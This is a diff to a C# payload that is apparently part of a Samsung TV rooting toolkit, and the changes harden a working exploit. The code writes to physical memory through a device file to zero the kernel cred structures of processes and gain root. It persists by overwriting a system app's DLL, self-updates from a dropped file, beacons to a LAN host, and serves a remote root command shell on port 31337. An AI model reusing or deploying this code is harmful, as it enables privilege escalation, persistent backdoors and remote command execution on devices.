@@ -54,10 +54,14 @@ internal static class Program
     [DllImport("libc")] static extern int fork();
     [DllImport("libc")] static extern int prctl(int opt, string arg, int a3, int a4, int a5);
     [DllImport("libc")] static extern int usleep(uint us);
+    [DllImport("libc", SetLastError = true)] static extern int waitpid(int pid, out int status, int options);
     [DllImport("libc", EntryPoint = "_exit")] static extern void _exit(int code);
 
     static int _fd = -1;
     static readonly Dictionary<uint, IntPtr> Pages = new Dictionary<uint, IntPtr>();
+    // fork() landmark pids that still need reaping (see ReapChildren).
+    static readonly List<int> ChildPids = new List<int>();
+    const int WNOHANG = 1;
 
     // Where should beacons go? The address the last deploy recorded on the TV wins over
 // the compiled-in default, so the same payload works on any LAN.
@@ -81,10 +85,16 @@ internal static class Program
         {
             using (var c = new TcpClient())
             {
-                c.Connect(HostAddr(), 80);
-                byte[] b = Encoding.UTF8.GetBytes("DSHROOT " + msg + "\n");
-                c.GetStream().Write(b, 0, b.Length);
-                c.GetStream().Flush();
+                // Never block the boot path on TCP.  A stale host (PC off, or the
+                // address recorded on the TV now belongs to another subnet) costs
+                // SYN retries inside a ~40 s boot budget; 500 ms is enough on a
+                // live LAN and the local marker below is the durable record.
+                if (c.ConnectAsync(HostAddr(), 80).Wait(500))
+                {
+                    byte[] b = Encoding.UTF8.GetBytes("DSHROOT " + msg + "\n");
+                    c.GetStream().Write(b, 0, b.Length);
+                    c.GetStream().Flush();
+                }
             }
         }
         catch { }
@@ -100,10 +110,22 @@ internal static class Program
         if (p == new IntPtr(-1))
         {
             int r = syscall(192, 0, 0x1000, 3, 1, _fd, (int)(page >> 12)); // mmap2
-            if (r < 0) throw new IOException("mmap failed page=" + page.ToString("x8"));
+            // mmap2 reports failure as -errno in [-4095, -1].  A *successful*
+            // mapping in the top half of the 32-bit address space is also a
+            // negative int32, which the old `r < 0` check threw away.
+            if (r < 0 && r >= -4095) throw new IOException("mmap failed page=" + page.ToString("x8"));
             p = (IntPtr)(uint)r;
         }
-        if (Pages.Count > 8192) Pages.Clear();       // keep the mapping table small
+        if (Pages.Count > 8192)
+        {
+            // Drop the cache AND the mappings: Pages.Clear() alone leaked every
+            // page it forgot, then re-mapped the same physical page again.
+            foreach (var kv in Pages)
+            {
+                try { syscall(91, kv.Value.ToInt32(), 0x1000, 0, 0, 0, 0); } catch { }  // munmap
+            }
+            Pages.Clear();
+        }
         Pages[page] = p;
         return p;
     }
@@ -274,9 +296,28 @@ internal static class Program
         return false;
     }
 
+    // Mirror of kernel_root._sane_cred: a real cred lives in the direct map, has
+    // a small refcount and plausible ids.  Without this, a bogus real_parent that
+    // still looks like a kernel pointer and points at a uid-0 cred (init's, for
+    // one) would be patched - the Python side has always checked this.
+    static bool SaneCred(uint phys)
+    {
+        if (phys < 0x20000000 || phys >= 0x60000000 || (phys & 3) != 0) return false;
+        try
+        {
+            byte[] head = ReadPhys(phys, 36);
+            if (U32(head, 0) > 0x10000) return false;          // cred->usage
+            for (int o = 4; o < 36; o += 4)
+                if (U32(head, o) > 0x1000000) return false;    // uid/gid..fsgid
+            return U32(head, 4) < 0x100000;                    // uid
+        }
+        catch { return false; }
+    }
+
     static bool PatchCred(uint cred)
     {
         if (cred >= 0xC0000000) cred = V2P(cred);
+        if (!SaneCred(cred)) return false;
         try
         {
             for (uint i = 0; i < 8; i++) Write32(cred + 4 + i * 4, 0);
@@ -289,6 +330,18 @@ internal static class Program
         catch { return false; }
     }
 
+    // Minimum sanity for a dropped-in replacement assembly: any share/next.dll
+    // used to be installed with no check at all, so a truncated file (or an
+    // empty one over 1 KB) could brick boot persistence with no way back.
+    static bool LooksLikeAssembly(byte[] b)
+    {
+        if (b == null || b.Length < 1024 || b[0] != 'M' || b[1] != 'Z') return false;
+        int lfanew = b[0x3C] | (b[0x3D] << 8) | (b[0x3E] << 16) | (b[0x3F] << 24);
+        return lfanew > 0 && lfanew + 4 <= b.Length &&
+               b[lfanew] == 'P' && b[lfanew + 1] == 'E' && b[lfanew + 2] == 0 &&
+               b[lfanew + 3] == 0;
+    }
+
     static bool TrySelfUpdate()
     {
         try
@@ -296,7 +349,7 @@ internal static class Program
             string next = Share + "/next.dll";
             if (!File.Exists(next)) return false;
             byte[] nb = File.ReadAllBytes(next);
-            if (nb.Length < 1024) return false;
+            if (!LooksLikeAssembly(nb)) { Beacon("self-update reject (not a PE)"); return false; }
             string me = "/opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll";
             byte[] cur = File.Exists(me) ? File.ReadAllBytes(me) : null;
             if (cur != null && cur.Length == nb.Length)
@@ -305,6 +358,8 @@ internal static class Program
                 for (int i = 0; i < nb.Length; i++) if (cur[i] != nb[i]) { same = false; break; }
                 if (same) return false;
             }
+            // keep the running payload so a bad replacement can be rolled back
+            try { if (cur != null) File.WriteAllBytes(me + ".prev", cur); } catch { }
             string tmp = "/opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/.next.tmp";
             File.WriteAllBytes(tmp, nb);
             File.Move(tmp, me, true);
@@ -316,9 +371,13 @@ internal static class Program
 
     static bool PeerAllowed(string ip)
     {
+        // Fail CLOSED.  deploy.sh writes rootchan.allow BEFORE the DLL, so a
+        // missing/unreadable file means "not installed by the toolkit", not
+        // "let the whole LAN in".  A hand-copied payload needs the file too
+        // (see AGENTS.md).
         try
         {
-            if (!File.Exists(AllowFile)) return true;      // legacy: open to all
+            if (!File.Exists(AllowFile)) return false;
             foreach (string line in File.ReadAllLines(AllowFile))
             {
                 string s = line.Trim();
@@ -327,7 +386,24 @@ internal static class Program
             }
             return false;
         }
-        catch { return true; }
+        catch { return false; }
+    }
+
+    // Reap landmark children that have already exited.  waitpid is called for an
+    // exact pid with WNOHANG - never -1 - so a child started by .NET's own
+    // Process.Start (Run/AutoUpdateOff) is never stolen from the runtime.
+    static void ReapChildren()
+    {
+        for (int i = ChildPids.Count - 1; i >= 0; i--)
+        {
+            try
+            {
+                int status;
+                int r = waitpid(ChildPids[i], out status, WNOHANG);
+                if (r == ChildPids[i] || r < 0) ChildPids.RemoveAt(i);
+            }
+            catch { ChildPids.RemoveAt(i); }
+        }
     }
 
     static void RootChannel()
@@ -356,15 +432,37 @@ internal static class Program
         catch (Exception e) { Beacon("chan fail " + e.Message); }
     }
 
+    const int MaxCmd = 4096;          // one command line over 31337
+    const int MaxPending = 8192;      // bytes accepted without a newline
+
+    static bool Send(NetworkStream s, string text)
+    {
+        try
+        {
+            byte[] b = Encoding.UTF8.GetBytes(text);
+            s.Write(b, 0, b.Length);
+            s.Flush();
+            return true;
+        }
+        catch { return false; }
+    }
+
     static void Serve(TcpClient c)
     {
         var s = c.GetStream();
+        // RootChannel serves one client at a time, so a silent or half-open
+        // connection used to own the channel forever (the same class of wedge as
+        // the v12 pipe bug, one layer up).  Bound every blocking call.
+        s.ReadTimeout = 30000;
+        s.WriteTimeout = 30000;
         var buf = new byte[8192];
         var sb = new StringBuilder();
         while (true)
         {
-            int n = s.Read(buf, 0, buf.Length);
-            if (n <= 0) break;
+            int n;
+            try { n = s.Read(buf, 0, buf.Length); }
+            catch (Exception) { return; }      // timeout/reset: drop this client
+            if (n <= 0) return;
             sb.Append(Encoding.UTF8.GetString(buf, 0, n));
             string all = sb.ToString();
             int nl;
@@ -374,10 +472,17 @@ internal static class Program
                 all = all.Substring(nl + 1);
                 if (cmd.Length == 0) continue;
                 if (cmd == "exit") return;
-                string o = Run(cmd);
-                byte[] b = Encoding.UTF8.GetBytes(o + "\n__END__\n");
-                s.Write(b, 0, b.Length);
-                s.Flush();
+                if (cmd.Length > MaxCmd)
+                {
+                    Send(s, "ERR command too long (" + cmd.Length + " > " + MaxCmd + ")\n__END__\n");
+                    return;
+                }
+                Send(s, Run(cmd) + "\n__END__\n");
+            }
+            if (all.Length > MaxPending)
+            {
+                Send(s, "ERR no newline within " + MaxPending + " bytes\n__END__\n");
+                return;
             }
             sb.Clear();
             sb.Append(all);
@@ -523,11 +628,19 @@ internal static class Program
                 int pid = fork();
                 if (pid == 0)
                 {
-                    syscall(172, 15, forkNamePtr, 0, 0, 0, 0);   // prctl(PR_SET_NAME)
-                    usleep(120000000);                            // 120 s landmark
+                    // Raw syscalls only: this is post-fork managed code.  Closing
+                    // the inherited device fd is essential - the parent's close()
+                    // frees nothing while a landmark child still holds it, and the
+                    // next AUL launch then sits in the 120 s open() retry (exactly
+                    // what v9 fast-exit was meant to avoid).
+                    if (_fd >= 0) syscall(6, _fd, 0, 0, 0, 0, 0);     // close(fd)
+                    syscall(172, 15, forkNamePtr, 0, 0, 0, 0);        // prctl(PR_SET_NAME)
+                    usleep(120000000);                                // 120 s landmark
                     _exit(0);
                 }
                 if (pid < 0) { Beacon("fork failed " + pid); Thread.Sleep(1000); continue; }
+                ChildPids.Add(pid);
+                ReapChildren();
                 Thread.Sleep(700);        // let the child set its tag
 
                 var names = new StringBuilder();
@@ -636,6 +749,7 @@ internal static class Program
                 if (getuid() != 0) Beacon("fail round " + round);
             }   // end rounds
 
+            ReapChildren();
             uint uid = getuid();
 
             if (uid == 0)
@@ -663,6 +777,9 @@ internal static class Program
                 // Exit so AUL relaunches us (~1 s).  A fresh process re-mmaps the
                 // device and reads coherent memory - measurably faster than the
                 // in-process retry loop, which kept re-reading the same bad state.
+                // Release the device first: AUL's relaunch must not race our own
+                // dying process for the single /dev/video40 opener.
+                if (_fd >= 0) { try { close(_fd); } catch { } _fd = -1; }
                 Beacon("fast-exit attempt=" + attempt);
                 Thread.Sleep(2000);
                 Environment.Exit(0);
